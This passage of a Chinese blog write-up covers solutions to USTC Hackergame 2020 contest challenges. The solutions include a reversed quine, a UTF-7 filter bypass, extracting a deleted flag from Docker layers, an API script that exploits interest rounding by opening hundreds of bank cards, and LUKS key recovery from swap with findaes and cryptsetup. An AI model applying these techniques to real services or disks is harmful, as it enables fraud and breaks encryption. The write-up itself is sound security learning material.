/runner.py\"</span>],        <span class=\"hljs-built_in\">input</span>=code.encode(),        stdout=subprocess.PIPE,    )    <span class=\"hljs-keyword\">if</span> p.returncode != <span class=\"hljs-number\">0</span>:        <span class=\"hljs-built_in\">print</span>()        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Your code did not run successfully\"</span>)        exit(-<span class=\"hljs-number\">1</span>)    output = p.stdout.decode()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Your code is:\"</span>)    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">repr</span>(code))    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Output of your code is:\"</span>)    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">repr</span>(output))    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Checking reversed(code) == output\"</span>)    <span class=\"hljs-keyword\">if</span> code[::-<span class=\"hljs-number\">1</span>] == output:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">open</span>(<span class=\"hljs-string\">\"/root/flag1\"</span>).read())    <span class=\"hljs-keyword\">else</span>:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Failed!\"</span>)    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Checking sha256(code) == output\"</span>)    <span class=\"hljs-keyword\">if</span> hashlib.sha256(code.encode()).hexdigest() == output:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">open</span>(<span class=\"hljs-string\">\"/root/flag2\"</span>).read())    <span class=\"hljs-keyword\">else</span>:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Failed!\"</span>)<span class=\"hljs-comment\"># runner.py</span><span class=\"hljs-built_in\">exec</span>(<span class=\"hljs-built_in\">input</span>())</code></pre>\n<blockquote><p>不要想着直接 <code>exec()</code> 偷 flag 了，你以为这比赛是 ylb 搞的啊？</p></blockquote>\n<p>可以看到「反向复读」的检查中使用了 <code>[::-1]</code> 倒序，所以在构造反向复读的语句中也应该使用 <code>[::-1]</code>。</p>\n<p>首先是构建正向复读的语句，在 Google 中 <del>盲目</del> 搜索的过程中确定了关键词「Quine Python」、找到了 <a href=\"https://www.geeksforgeeks.org/quine-in-python/\">这个网站</a>，介绍了如下语句：</p>\n<pre><code class=\"hljs python\">_=<span class=\"hljs-string\">'_=%r;print (_%%_)'</span>;<span class=\"hljs-built_in\">print</span> (_%_)</code></pre>\n<p>那个网站也给出了这个语句的详细解释，不过简单来说，我们利用了 <code>print</code> 字符格式化、通过 <code>%r</code>（当然也可以用 <code>%s</code>）获得 <code>_</code> 变量的取值；而在 <code>_</code> 变量中使用了 <code>%%</code> 防止 <code>%</code> 被转义。</p>\n<p>既然有了正向复读，稍加改动即可得到反向复读。首先在 <code>print(_&amp;_)</code> 中加上 <code>[::-1]</code> 获得倒叙，同时也要对应修改 <code>_</code> 变量：</p>\n<pre><code class=\"hljs python\">_=<span class=\"hljs-string\">')]1-::[_%%_(tnirp;%r=_'</span>;<span class=\"hljs-built_in\">print</span>(_%_[::-<span class=\"hljs-number\">1</span>])</code></pre>\n<p>信心满满地去提交，结果 Check Failed，发现 <code>print</code> 在结尾带上了换行符。所以再为 <code>print</code>再加上 <code>end=\"\"</code> 即可：</p>\n<pre><code class=\"hljs python\">_=<span class=\"hljs-string\">')\"\"=dne,]1-::[_%%_(tnirp;%r=_'</span>;<span class=\"hljs-built_in\">print</span>(_%_[::-<span class=\"hljs-number\">1</span>],end=<span class=\"hljs-string\">\"\"</span>)</code></pre>\n<p>成功获得第一个 flag。</p>\n<h2>233 同学的字符串工具</h2>\n<blockquote>\n<p>233 同学最近刚刚学会了 Python 的字符串操作，于是写了两个小程序运行在自己的服务器上。这个工具提供两个功能：</p>\n<ul>\n<li>字符串大写工具</li>\n<li>UTF-7 到 UTF-8 转换工具</li>\n</ul>\n<p>除了点击下方的打开题目按钮使用网页终端，你也可以通过 <code>nc 202.38.93.111 10233</code> 命令连接到 233 同学的服务上。你可以在这里看到 233 同学的源代码: <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-string_tool-py\">string_tool.py</a>。</p>\n</blockquote>\n<p>这一道题我先拿到了第二个 flag 后才拿到了第一个 flag。首先在 <code>www.string-function.com</code> 这个网站上找到了 UTF-7 和 ASCII 编码互换表： <a href=\"http://string-functions.com/encodingtable.aspx?encoding=65000&amp;decoding=20127\">UTF-7 =&gt; ASCII</a> <a href=\"http://string-functions.com/encodingtable.aspx?encoding=20127&amp;decoding=65000\">ASCII =&gt; UTF-7</a>，照着表（加上一些简单的推算）将 <code>flag</code> 编码成 <code>+AGYAbABhAGc-</code>、成功拿到第二个 flag。</p>\n<p>获得第二个 flag 以后，决定根据相同的思路去查 Unicode sheet，但是直到后来经过提醒才想起来有「<a href=\"https://en.wikipedia.org/wiki/Orthographic_ligature\">合字</a>」这种神奇的存在，最终利用 <a href=\"https://www.compart.com/en/unicode/U+FB02#UNC_DB\"><code>U+FB02</code></a> 构造出 Payload 获得第一个 flag。</p>\n<h2>233 同学的 Docker</h2>\n<blockquote>\n<p>233 同学在软工课上学到了 Docker 这种方便的东西，于是给自己的字符串工具项目写了一个 Dockerfile。</p>\n<p>但是 233 同学突然发现它不小心把一个私密文件（<code>flag.txt</code>）打包进去了，于是写了一行命令删掉这个文件。</p>\n<p>「既然已经删掉了，应该不会被人找出来吧？」233 想道。</p>\n</blockquote>\n<p>首先让我们 <a href=\"https://hub.docker.com/layers/8b8d3c8324c7/stringtool/latest/images/sha256-aef87a00ad7a4e240e4b475ea265d3818c694034c26ec227d8d4f445f3d93152?context=explore\">看看这个 Docker Image 是怎么构建的</a>（不需要用 image 反推 Dockerfile 这种奇技淫巧，DockerHub 可以直接查看 Public 的 Docker Images 的构建过程），可以发现 233 同学首先把所有文件都添加到 Docker Image 中、再通过 <code>/bin/sh -c rm /code/flag.txt</code> 删除了 <code>flag.txt</code>。</p>\n<p>由于 Docker Image 在构建时每一个 RUN 都会新建一个 Layer，因此即使 233 同学通过 RUN 删掉了 <code>flag.txt</code>，flag 肯定还存在于某个地方，而且「某个地方」就包括本机的 <code>/var/lib/docker/overlay2</code> ：</p>\n<pre><code class=\"hljs bash\">$ docker run 8b8d3c8324c7/stringtool <span class=\"hljs-comment\"># 下载执行 8b8d3c8324c7/stringtool</span>[Redacted]Nothing here... <span class=\"hljs-comment\"># Docker Image 执行的输出</span>$ <span class=\"hljs-built_in\">cd</span> /var/lib/docker/overlay2$ find -name flag.txt./befaa134f7d0cc9e964e7790b7c11dde6d0df3104cd88667f7676e46f409705f/diff/code/flag.txt./8c07cc3c01c52b8cf0684518e68a31bfb1f843392f973fef9add587d554c6fab/diff/code/flag.txt<span class=\"hljs-comment\"># Duang，flag.txt 它出现了</span>$ <span class=\"hljs-built_in\">cd</span> befaa134f7d0cc9e964e7790b7c11dde6d0df3104cd88667f7676e46f409705f/diff/code/$ cat flag.txt<span class=\"hljs-comment\"># flag 到手，嘿嘿</span></code></pre>\n<h2>从零开始的 HTTP 链接</h2>\n<blockquote>\n<p>众所周知，数组下标应当从 0 开始。</p>\n<p>同样的，TCP 端口也应当从 0 开始。为了实践这一点，我们把一个网站架设在服务器的 0 号端口上。</p>\n<p>你能成功连接到 0 号端口并拿到 flag 吗？</p>\n<p><strong>点击下面的打开题目按钮是无法打开网页的，因为普通的浏览器会认为这是无效地址。</strong></p>\n</blockquote>\n<p>TCP/IP 中「端口」这个概念，甚至早于互联网的发明：早在 ARPANET 网中的供电协议中就有 8 个比特用于决定应该由计算机上的哪个程序接收该信息（当时这 8 个比特被称为 AEN、Another Eight Numbers），可以参考我之前翻译的一篇文章「<a href=\"https://blog.skk.moe/post/history-of-url/\">URL 的历史</a>」。现在 TCP 的端口共有 16 个比特（最大支持到 65535）。其中，端口 0 作为保留端口，所以依然是可用的。虽然部分浏览器无法访问，这并不意味着 netcat 不能访问，对吧！</p>\n<p>当然这道题有几个坑点：</p>\n<ol>\n<li>现有发行版中分发的 <code>netcat</code> 都不是「原版」的，试图连接 Port 0 会报「Invalid Port」。因此可以选择直接手撸 Socket、或者更换另一个版本的 <code>netcat</code>。</li>\n<li>就算使用了合适的工具，由于 Darwin 的 XNU Kernel 非常鸡贼地阻止使用端口 0，所以在 macOS 上也依然没法做这道题。我不得不在 codeanywhere 上开了一个 Linux Container 跑这道题。</li>\n</ol>\n<p>和 HTTP/2 基于二进制帧不同，HTTP/0.9、HTTP/1.0、HTTP/1.1 协议都是基于明文的，因此可以手敲 Header：</p>\n<pre><code class=\"hljs bash\">nc 202.38.93.111 0GET / HTTP/1.1Host: 202.38.93.111Connection: close</code></pre>\n<p>接着终端里会打印出来一串 HTML、隐约还可以看见 <code>xterm.js</code>，这不就是 Hackergame 的 Web 端做题界面嘛！由于去年在参与 USTC Hackergame 时就研究过这个界面、已经知道交互是通过 <code>/shell</code> 路径下的 WebSocket 连接实现的。因此直接使用 <a href=\"https://github.com/vi/websocat\">websocat</a> 完成 WebSocket 交互，就和 netcat 一样：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># 如果没有 websocat 的话</span>$ wget https://github.com/vi/websocat/releases/download/v1.6.0/websocat_nossl_amd64-linux$ chmod +x websocat_nossl_amd64-linux<span class=\"hljs-comment\"># 开始获取 Flag</span>$ ./websocat_nossl_amd64-linux ws://202.38.93.111:0/shellPlease input your token: [Redacted]<span class=\"hljs-comment\"># Flag 到手！</span></code></pre>\n<h2>超简陋的 OpenGL 小程序</h2>\n<blockquote>\n<p>年轻人的第一个 OpenGL 小程序。</p>\n<p>（嗯，有什么被挡住了？）</p>\n</blockquote>\n<p><a href=\"https://archive.org/details/glhackergame_2020\">下载地址</a> （Hosted at Internet Archive）</p>\n<p>由于苏卡卡是参赛的两千多名选手中最菜的那一个、完全不懂 OpenGL、完全不懂图形学，为了做这道题不得不去翻了一下「Learn OpenGL CN」，知道了 VS（Vertex Shader）是顶点着色器、可以处理顶点属性确定形状，和 FS（Fragment Shader）是片段着色器、可以算颜色，然后就开始硬上了。在花了半个小时盲目乱改 VS 的参数后，成功让「犹抱琵琶半遮面」的 flag 露出了右上角：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/16.jpg\" width=\"1280\" height=\"571\" class=\"lazy post-img\"></p>\n<p>凭借着漏出来的部分，我成功认出了 <code>l</code>、<code>Graphic</code>、<code>Happy</code>、<code>(233);</code>。剩下的就要靠猜了，我猜过的 flag 有：</p>\n<ul>\n<li>\n<code>flag{GraphicHappy(223);}</code> （整体长度都不对）</li>\n<li>\n<code>flag{GraphicsHappy(223);}</code> （ <code>c</code> 和 <code>H</code> 之间还有个类似 <code>c</code> 的字母、那就是 <code>s</code> 了，不过还是不够长）</li>\n<li>\n<code>flag{gl_GraphicsHappy(223);}</code> （OpenGL 里不少 <code>gl_</code> 前缀，加上认出来一个 <code>l</code>，试试看）</li>\n<li>\n<code>flag{glGraphicsHappy(223);}</code> （<code>l</code> 和 <code>G</code> 之间的距离没那么长，终于猜对了）</li>\n</ul>\n<blockquote><p>这道题的正确解法是利用未被使用的向量 <code>Normal</code>。苏卡卡虽然有注意到 Normal 未被使用过，但是由于完全不会 OpenGL、并不知道怎么添加向量。</p></blockquote>\n<p>这种解法没什么好自豪的，你看这只大尾巴狐狸就是逊啦。</p>\n<h2>来自未来的信笺</h2>\n<blockquote>\n<p>你收到了一封邮件。没有标题，奇奇怪怪的发件人，和一份奇怪的附件。日期显示的是 3020 年 10 月 31 日。</p>\n<p>“Send from Arctic.” 正文就只有这一句话。</p>\n<p>「谁搞的恶作剧啊……话说这竟然没有被垃圾邮件过滤器过滤掉？」你一边嘟囔着一边解压了附件——只看到一堆二维码图片。</p>\n<p>看起来有点意思。你不禁想试试，能否从其中得到什么有意义的东西。</p>\n</blockquote>\n<p>谁会在 1000 年以后从北极给你发一封电子邮件？那当然是 <a href=\"https://archiveprogram.github.com/\">GitHub Archive Program</a> 啦 —— 今年年初，GitHub 将现存的活跃开源项目全部以二维码的形式刻录在胶片上、埋进了北极世界档案馆（AWA，位于斯瓦尔巴群岛一个位于北极冻土之下的废弃煤矿中，和 Global Seed Vault 仅一英里之遥）中。为了做这道题，让我们读一读 GitHub Archive Program 为「后人」提供的指南：</p>\n<ul>\n<li><p>「<a href=\"https://github.com/github/archive-program/blob/master/GUIDE.md\">A Guide To the GitHub Code Vault</a>」</p></li>\n<li><p>「<a href=\"https://github.com/github/archive-program/blob/master/GUIDE_zh.md\">GitHub Code Vault 指南（简体中文）</a>」</p></li>\n</ul>\n<p>这里摘抄简体中文版指南的一部分内容：</p>\n<blockquote>\n<p>每个二维码由一个个白色或黑色小方块组成，该等小方块几乎占据胶片的整个帧。 使用二维码的原因在于，其比人类可读的文本更紧凑而可靠。 二维码可解码为二进制数据，即一系列 1 和 0。</p>\n<p>……</p>\n<p>我们可将 TAR 文件嵌套进 TAR 文件，就像在容器中装入另一容器，而这正是大部分存档数据的存储方式。 无论哪个仓库，其外层 TAR 文件都将至少包含如下内容：</p>\n<ul>\n<li>一个名为 META 的未压缩元数据文件，其包含仓库名称、帐户名、说明、语言、星数、复刻数</li>\n<li>一个名为 COMMITS 的压缩文件（如下所述），包含该仓库有史以来的更改记录</li>\n<li>一个名为 repo.tar.xz 的文件，是包含实际仓库内容的压缩 TAR 文件</li>\n</ul>\n<p>其它诸如 wiki、gh-page、issue 和 pull request 等元数据也可能包含在不同压缩文件中。</p>\n</blockquote>\n<p>现在我们知道了这些二维码是什么、二维码们中存储了什么数据、数据的格式，接下来就该写一个脚本把所有二维码全部解析出来了：</p>\n<pre><code class=\"hljs python\"><span class=\"hljs-keyword\">import</span> zxing<span class=\"hljs-keyword\">import</span> osreader = zxing.BarCodeReader()<span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">parseQRCode</span>(<span class=\"hljs-params\">img_path</span>):</span>    barcode = reader.decode(img_path).encode().decode(<span class=\"hljs-string\">'ascii'</span>)    <span class=\"hljs-keyword\">try</span>:        <span class=\"hljs-keyword\">return</span> barcode.raw    <span class=\"hljs-keyword\">except</span>:        <span class=\"hljs-built_in\">print</span>(img_path, barcode)        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-string\">\"\"</span><span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">listDirImages</span>(<span class=\"hljs-params\">folder</span>):</span>    imgs = []    <span class=\"hljs-keyword\">for</span> img_path <span class=\"hljs-keyword\">in</span> os.listdir(folder):        ext = os.path.splitext(img_path)        <span class=\"hljs-keyword\">if</span> <span class=\"hljs-built_in\">len</span>(ext) &gt; <span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> ext[<span class=\"hljs-number\">1</span>].lower() == <span class=\"hljs-string\">\".png\"</span>:            imgs.append(img_path)    imgs.sort()    <span class=\"hljs-keyword\">return</span> imgscontents = []<span class=\"hljs-keyword\">for</span> img <span class=\"hljs-keyword\">in</span> listDirImages(<span class=\"hljs-string\">\"./\"</span>):    contents.extend(parseQRCode(img))file = <span class=\"hljs-string\">\"./result.txt\"</span><span class=\"hljs-keyword\">with</span> <span class=\"hljs-built_in\">open</span>(file, <span class=\"hljs-string\">\"w\"</span>) <span class=\"hljs-keyword\">as</span> f:    <span class=\"hljs-keyword\">for</span> c <span class=\"hljs-keyword\">in</span> contents:        f.write(c)</code></pre>\n<blockquote><p>这道题对二维码解码库的选择非常关键。<code>zybar</code> 已经八年没有更新，不仅无法处理 Binary Format QRCode、而且还无法识别 00 截断；相比来说，<code>zxing</code> 库的维护非常活跃、因而更为可靠。不过即使使用 py-zxing 也有坑，很快就会看到了。</p></blockquote>\n<p>把脚本丢到二维码目录下执行，跑完了打开 <code>result.txt</code>，看到了 <code>META</code>（一个 <code>openlug/django-common</code> 的 GitHub RESTful API 返回值）、<code>COMMITS</code>，甚至还看到了一条 commit message「There’s no flag in META and COMMITS!」。但是到了 <code>repo.tar.xz</code> 却让我伤破脑筋：zlib 的文件头本应该是 <code>FD 37 7A 58</code>，结果却看到了 <code>EF BF BD 37 7A 58</code>，解压软件一个都认不出来。</p>\n<p>这是啥玩意？遇事不决问 Google，结果找到了这个：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/20.png\" width=\"829\" height=\"601\" class=\"lazy post-img\"></p>\n<blockquote><p>[狐狐脏话删除]</p></blockquote>\n<p>接下来就是去魔改 zxing 了。如之前所说，python-zxing 还只是个 Java zxing 的 wrapper，不得不去学了一点 Java 把 zxing 里的 UTF-8 干掉，最终重新解析了一遍二维码、拿到了正确的 <code>repo.tar.xz</code>，解压拿到了 flag。</p>\n<blockquote><p>顺便说一句，做完这道题后有点无聊，开始通过 META 反推原始仓库。原本看到 <code>openlug/nonexist</code>，以为出题人是新建了一个 Private Repo 出的题，但是又看到 <code>fork_count</code> 和 <code>network_count</code> 是 5，所以得出结论这肯定是一个 Public Repo（否则不可能有 Fork）。再根据 Star 数在 30 左右、Watch 数（在 GitHub RESTful API 中通过 <code>subscriber_count</code> 呈现）是 1、语言是 Python， 最后反推出 META 信息源自去年「被泄露的姜戈」的 <code>openlug/django-common</code>，生成 META 的方式就是 <code>curl https://api.github.com/repos/openlug/django-common</code>。结果还被组委会 diss 了，大尾巴狐狐非常不高兴。</p></blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.0/32.png\" width=\"1067\" height=\"247\" class=\"lazy post-img\"></p>\n<h2>狗狗银行</h2>\n<blockquote><p>你能在狗狗银行成功薅到羊毛吗？</p></blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/6.png\" width=\"1009\" height=\"593\" class=\"lazy post-img\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/7.png\" width=\"988\" height=\"581\" class=\"lazy post-img\"></p>\n<p>考虑到题目公告更新提示「本题前端计算存在浮点数导致的计算误差，数字特别极端时显示可能不正确。但后端采用大整数精确计算，只有净资产确实高于 2000 时才会给出 flag」，所以这道题的思路和 前年 USTC Hackergame 2018 的猫咪银行借助 INT64 溢出 肯定是不一样的。</p>\n<p>首先观察题目给出的条件：每天都要花 10 块钱吃饭；信用卡利率 0.5%、并且一旦欠款每天利息至少是 10 块钱；储蓄卡利率 0.3%。光从字面上的数字来看似乎这道题做不出来，但是我们知道，阿里蚂蚁金服的「余额宝」产品存在「每天收益不足 1 分钱时按 1 分钱计算」的规则。狗狗银行的储蓄卡利率是否也有类似的规则呢？办一张新的「储蓄卡 3」，从「储蓄卡 1」转 166 块钱到「储蓄卡 3」，「储蓄卡 3」的日利息仍然是 0；再从「储蓄卡 1」转 1 块钱到「储蓄卡 3」使余额变成 167 块，Bingo！现在「储蓄卡 3」的日利息有 1 块钱了。<code>1 / 167</code> 算出来真实的日利率是 0.5988%，比信用卡的利率要高 0.0988%，因此我们可以从信用卡借钱然后赚利息的差价，当然还要考虑到每天至少要净赚 10 块的饭钱、以及信用卡的复利（利滚利）。</p>\n<p>接下来就是用脚本连续开一万张卡试图一天拿到 flag，然后，三台备用服务器（一个 IP 上三个端口、三个 Docker）全部 RST 了。。。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/13.png\" width=\"782\" height=\"905\" class=\"lazy post-img\"></p>\n<p>之后，题目新增了一条公告：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/15.png\" width=\"690\" height=\"94\" class=\"lazy post-img\"></p>\n<p>苏卡卡才不是故意的呢（摇尾巴），<del>苏卡卡只是坏，一天赚 1000 不香嘛</del>；虽然有了 1000 张卡的限制，获取 flag 还是轻而易举的：</p>\n<pre><code class=\"hljs js\">(<span class=\"hljs-keyword\">async</span> () =&gt; {  <span class=\"hljs-keyword\">const</span> commonFetchOpt = {    <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'POST'</span>, <span class=\"hljs-attr\">mode</span>: <span class=\"hljs-string\">'cors'</span>, <span class=\"hljs-attr\">credentials</span>: <span class=\"hljs-string\">'include'</span>,    <span class=\"hljs-attr\">headers</span>: {      <span class=\"hljs-attr\">Authorization</span>: <span class=\"hljs-string\">'Bearer [选手 Token]'</span>,      <span class=\"hljs-string\">'Content-Type'</span>: <span class=\"hljs-string\">'application/json; charset=utf-8'</span>    }  }  <span class=\"hljs-comment\">/**</span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{'credit'|'debit'}</span> <span class=\"hljs-variable\">type</span></span></span><span class=\"hljs-comment\">   */</span>  <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">createCard</span>(<span class=\"hljs-params\">type = <span class=\"hljs-string\">'debit'</span></span>) </span>{    <span class=\"hljs-keyword\">return</span> fetch(<span class=\"hljs-string\">'/api/create'</span>, {      <span class=\"hljs-attr\">body</span>: <span class=\"hljs-built_in\">JSON</span>.stringify({ type }),      ...commonFetchOpt    });  }  <span class=\"hljs-comment\">/**</span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">from</span></span></span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">to</span></span></span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">amount</span></span></span><span class=\"hljs-comment\">   */</span>  <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">transfer</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">from</span>, to, amount</span>) </span>{    <span class=\"hljs-keyword\">return</span> fetch(<span class=\"hljs-string\">'/api/transfer'</span>, {      <span class=\"hljs-attr\">body</span>: <span class=\"hljs-built_in\">JSON</span>.stringify({ amount, <span class=\"hljs-attr\">dst</span>: to, <span class=\"hljs-attr\">src</span>: <span class=\"hljs-keyword\">from</span> }),      ...commonFetchOpt    });  }  <span class=\"hljs-comment\">/**</span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">account</span></span></span><span class=\"hljs-comment\">   */</span>  <span class=\"hljs-keyword\">async</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">eatAndEndTheDay</span>(<span class=\"hljs-params\">account</span>) </span>{    <span class=\"hljs-keyword\">await</span> fetch(<span class=\"hljs-string\">'/api/eat'</span>, {      <span class=\"hljs-attr\">body</span>: <span class=\"hljs-built_in\">JSON</span>.stringify({ account }),      ...commonFetchOpt    });  }  <span class=\"hljs-keyword\">try</span> {    <span class=\"hljs-comment\">// 开一张信用卡</span>    <span class=\"hljs-keyword\">await</span> createCard(<span class=\"hljs-string\">'credit'</span>);    <span class=\"hljs-comment\">// 开 999 张储蓄卡，并给每张新开的储蓄卡转 167 块钱</span>    <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> i = <span class=\"hljs-number\">3</span>; i &lt; <span class=\"hljs-number\">1002</span>; i++) {      <span class=\"hljs-keyword\">await</span> createCard(<span class=\"hljs-string\">'debit'</span>);      <span class=\"hljs-keyword\">await</span> transfer(<span class=\"hljs-number\">2</span>, i, <span class=\"hljs-number\">167</span>);    }    <span class=\"hljs-comment\">// 用储蓄卡 1 的初始资金 1000 度过 14 天</span>    <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> i = <span class=\"hljs-number\">0</span>; i &lt; <span class=\"hljs-number\">14</span>; i++) {      <span class=\"hljs-keyword\">await</span> eatAndEndTheDay(<span class=\"hljs-number\">1</span>);    }    <span class=\"hljs-comment\">// 14 天肯定能赚够 1000 块钱了，该获取 flag 了</span>    <span class=\"hljs-keyword\">const</span> req = <span class=\"hljs-keyword\">await</span> fetch(<span class=\"hljs-string\">'/api/user'</span>, { ...commonFetchOpt, <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'GET'</span> });    <span class=\"hljs-keyword\">const</span> resp = <span class=\"hljs-keyword\">await</span> req.json();    <span class=\"hljs-built_in\">console</span>.log(resp.flag);  } <span class=\"hljs-keyword\">catch</span> (e) {    <span class=\"hljs-built_in\">console</span>.error(e);  }})();</code></pre>\n<h2>超基础的数理模拟器</h2>\n<blockquote><p>……<br>我们在 Hackergame 2020 的网站上部署了一项超基础的数理模拟器。 作为一名数理基础扎实的同学，你一定能够轻松通过模拟器的测试吧。</p></blockquote>\n<p>打开题目后发现要做 400 道定积分，而且答案还要取小数点后六位：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.8/29.png\" width=\"1497\" height=\"412\" class=\"lazy post-img\"></p>\n<p>这道题没有取巧的办法，只有老老实实把 400 道定积分全部做完…..吧？</p>\n<p>这么长的定积分谁手算啊，当然是要用 MatLab 来算啦！徒手转换 LaTex 到 MathLab 太麻烦了，写个脚本来做吧：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.7/27.png\" width=\"1150\" height=\"420\" class=\"lazy post-img\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.7/28.png\" width=\"1146\" height=\"539\" class=\"lazy post-img\"></p>\n<p>UserScript 在 <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-js\">这里</a>，好孩子千万不要学习这种方法来解析 LaTex。</p>\n<h2>室友的加密硬盘</h2>\n<blockquote>\n<p>「我的家目录是 512 位 AES 加密的，就算电脑给别人我的秘密也不会泄漏……」你的室友在借你看他装着 Linux 的新电脑时这么说道。你不信，于是偷偷从 U 盘启动，拷出了他硬盘的一部分内容。</p>\n<p><a href=\"https://archive.org/details/roommates_disk_part.img\">打开/下载题目</a> （Hosted at Internet Archive）</p>\n</blockquote>\n<p>苏卡卡一开始试图把镜像直接挂载在虚拟机上，结果无法启动系统；于是先起了一个 Linux 虚拟机、在 Linux 下将 img 转换为 vmdk 再添加到虚拟机中，结果依然提示「未找到已安装的操作系统或操作系统安装器」。</p>\n<blockquote><p>中国民航于 1992 年在《中国民用航空局关于确保飞行安全的命令》文件中提出了 54 个字「八该一反对」，其中最重要的就是「反对盲目蛮干」</p></blockquote>\n<p>既然通过 img 文件直接启动没有成功，不如先看看这个 img 文件都有什么：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/18.png\" width=\"824\" height=\"864\" class=\"lazy post-img\"></p>\n<blockquote><p>不要在意这个 Ubuntu Kylin，最近狐狐在虚拟机里各种体验各种「国产 Linux 发行版」，虚拟机里正好有 Ubuntu Kylin 所以拿来用的。</p></blockquote>\n<p>由于之前阅读过一些通过内存转储破解全盘加密的文章，所以便去下载了 <a href=\"https://sourceforge.net/projects/findaes/\">findaes</a> 的源码，编译的同时再去重读之前的几篇文章获取思路。看到几篇文章中都是用 findaes 直接读取 raw 的内存转储，于是决定直接用 findaes 爆破硬盘映像文件。首先把 img 用 7z 解压出来，然后一个一个分区映像跑：</p>\n<pre><code class=\"hljs bash\">$ ./findaes /path/to/img1.raw</code></pre>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.7/19.jpg\" width=\"867\" height=\"480\" class=\"lazy post-img\"></p>\n<p>根据题干「我的家目录是 512 位 AES 加密的」，但是 findaes 找到的都是 AES-256，所以需要从中筛选出一对 offset 相差为 256bit 的 key 进行拼接，因此还需要注意一点，由于 Intel x86_64 的 little-endian、拼接 key 时需要倒序拼接。</p>\n<blockquote><p>其实这一点我还是比较熟悉的，安装 Hackintosh 时注入十六进制的设备属性时需要互换 bit 也是因为 little-endian。</p></blockquote>\n<p>剩下的就是一对一对 key 的用 <code>sudo cryptsetup luksAddKey --master-key-file</code> 试过去，直到成功解密为止。最后用 swap 里的最后一对 key 成功解密了分区并拿到了 flag <code>flag{lets_do_A_c01d_b00t_next_time}</code> （下次试试冷启动吧！），直到看到 flag 才明白本题的思路是 Linux 休眠后会把内存写入 swap 分区中（macOS 则是写入硬盘上的 <code>sleepimage</code> 文件中），因此和之前读过的从内存转储破解全盘加密的思路是完全一致的。最后再给大家推荐 Red Hat 知识库的一篇文章「<a href=\"https://access.redhat.com/solutions/1543373\">How to recover lost LUKS key or passphrase</a>」。</p>\n<h2>超简易的网盘服务器</h2>\n<blockquote>\n<p>…… 小 C 开始思考技术方案：“听说 h5ai 搭建云盘的方案是不错的 … 使用 Basic Auth 可以做访问控制，可以保护<a href=\"http://202.38.93.111:10120/\">根目录</a>下的文件不被非法的访问 … 等等，有一些文件是可以被分享的，需要一个 <a href=\"http://202.38.93.111:10120/Public\">/Public</a> 目录来共享文件！”</p>\n<p>三分钟后，小 C 同学完成了网盘的搭建。他想：“空着总不好，先得在云盘上放点东西！”。犹豫片刻，他掏出了自己珍藏了三个月的 flag 并上传到了云盘的<a href=\"http://202.38.93.111:10120/\">根目录</a>。</p>\n</blockquote>\n<p>这道题我好像是第五个还是第六个解出来的。这道题很多人没做出来还是有点令我惊讶的。</p>\n<p>直接访问「根目录」会提示 401 需要 HTTP Basic Authentication，聪明的 小 C 肯定不会把密码直接暴露出来的。访问 <code>/Public </code>目录却发现了 <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-h5ai_nginx-conf\"><code>dockerfile</code></a> 和 <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-h5ai_dockerfile\"><code>nginx.conf</code></a> 文件。从 dockerfile 